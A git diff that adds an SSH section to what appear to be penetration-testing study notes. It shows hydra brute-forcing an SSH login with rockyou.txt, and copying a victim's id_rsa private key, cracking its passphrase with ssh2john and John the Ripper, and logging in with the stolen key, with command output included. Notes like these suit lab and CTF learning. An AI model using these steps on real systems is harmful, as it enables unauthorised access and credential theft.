@@ -56,4 +56,49 @@ The FTP server may support either Active or Passive connections, or both.
 `[machine IP]`  The IP address of the target machine  
 `ftp / protocol`    Sets the protocol  
 
+## SSH
+### Exploiting SSH
+#### Crack SSH Password with hydra  
+`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ssh`  
+
+#### Crack SSH Private Key with John the Ripper
+SSH Key-Based Autherntication
+1. RSA-Private-key is in .ssh derectory. (id_rsa)
+```
+victim@target:~/.ssh$ ls -la
+
+total 16
+drwx------ 2 nullbyte nullbyte 4096 2019-06-19 13:49 .
+drwxr-xr-x 3 nullbyte nullbyte 4096 2019-06-19 13:46 ..
+-rw------- 1 nullbyte nullbyte 1743 2019-06-19 13:49 id_rsa
+-rw-r--r-- 1 nullbyte nullbyte  405 2019-06-19 13:49 id_rsa.pub
+```  
+2. `cat id_rsa` and copy, `nano victim_rsa` and paste.
+3. Crack the Private Key.  
+    `$ python3 /usr/share/john/ssh2john.py victim_rsa > rsa.hash`  
+    `$ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash`
+    <detail>
+    ```
+    $ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+    Cost 2 (iteration count) is 1 for all loaded hashes
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    beeswax          (id_rsa)
+    1g 0:00:00:00 DONE (2023-07-27 15:52) 16.66g/s 1378Kp/s 1378Kc/s 1378KC/s beeswax
+    Use the "--show" option to display all of the cracked passwords reliably
+    Session completed.
+    ```
+    </detail>  
+    `$ john --show rsa.hash`  
+4. SSH into the Target.
+    `$ chmod 600 victim_rsa`  
+    `$ ssh -i victim_rsa victim@<TARGET_IP>`  
+    Enter passphrase. (in this case "beeswax")  
+
+
+
+
+
 
